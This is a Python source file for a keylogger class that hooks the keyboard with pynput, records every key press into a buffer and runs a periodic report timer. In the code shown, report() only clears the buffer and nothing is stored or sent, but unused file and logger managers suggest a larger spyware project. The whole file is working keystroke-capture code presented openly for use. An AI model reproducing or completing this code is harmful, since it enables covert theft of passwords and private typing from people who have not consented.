from typing import Text
from src.model.persistance.directory_manager import *
from src.model.persistance.file_manager import *
from src.model.util.constants import *
from src.model.util.logger import *

from pynput import keyboard

import threading

class Keylogger:
    
    def __init__(self, secs) -> None:
        self.directory_manager = DirectoryManager()
        self.file_manager = FileManager()
        self.logger = Logger(Constants.PATH_LOG, Constants.FILE_NAME_LOG)

        self.text = ""
        self.secs = secs

    def append(self, text) -> str:
        self.text += text
        return self.text

    def clear(self) -> str:
        self.text = ""
        return self.text

    def on_key_pressed(self, key) -> None:
        try:
            current_key = str(key.char)
        except:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append(current_key)
   
    def report(self):
        self.clear()
        timer = threading.Timer(self.secs, self.report)
        timer.start()

    def start(self):
        with keyboard.Listener(
            on_press=self.on_key_pressed) as listener:
            self.report()
            listener.join()
